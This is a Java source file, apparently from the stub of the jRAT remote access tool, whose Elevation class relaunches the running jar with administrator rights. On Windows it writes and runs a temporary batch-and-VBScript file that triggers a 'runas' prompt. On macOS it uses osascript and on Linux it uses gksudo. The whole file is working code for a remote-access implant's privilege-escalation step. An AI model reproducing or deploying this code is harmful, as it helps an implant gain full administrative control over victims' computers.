package io.jrat.stub;

import io.jrat.stub.utils.Utils;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import oslib.OperatingSystem;

public class Elevation {

	public static void executeElevation() throws Exception {
		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
			File file = File.createTempFile("elev", ".bat");
			PrintWriter writer = new PrintWriter(new FileOutputStream(file));
			
			writer.println(":checkPrivileges");
			writer.println("NET FILE 1>NUL 2>NUL");
			writer.println("if '%errorlevel%' == '0' ( goto gotPrivileges ) else ( goto getPrivileges ) ");
			writer.println(":getPrivileges");
			writer.println("if '%1'=='ELEV' (shift & goto gotPrivileges)");
			writer.println("setlocal DisableDelayedExpansion");
			writer.println("set \"batchPath=%~0\"");
			writer.println("setlocal EnableDelayedExpansion");
			writer.println("ECHO Set UAC = CreateObject^(\"Shell.Application\"^) > \"%temp%\\OEgetPrivileges.vbs\""); 
			writer.println("ECHO UAC.ShellExecute \"!batchPath!\", \"ELEV\", \"\", \"runas\", 1 >> \"%temp%\\OEgetPrivileges.vbs\"");
			writer.println("\"%temp%\\OEgetPrivileges.vbs\"");
			writer.println("exit /B");
			
			writer.println(":gotPrivileges ");
			writer.println("setlocal & pushd .");
			
			String javapath = System.getProperty("java.home") + "\\bin\\java";			
			writer.println("\"" + javapath + "\" -jar \"" + Utils.getJarFile().getAbsolutePath() + "\"");

			writer.close();
		
			Runtime.getRuntime().exec(file.getAbsolutePath());

			file.deleteOnExit();
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.MACOS) {
			String[] command = { "osascript", "-e", "do shell script \"java -jar " + Utils.getJarFile().getAbsolutePath() + "\" with administrator privileges" };
			Runtime.getRuntime().exec(command);
		} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.LINUX) {
			String[] command = { "gksudo", "java -jar '" + Utils.getJarFile().getAbsolutePath()  + "'" };
			Runtime.getRuntime().exec(command);
		}
	}

}
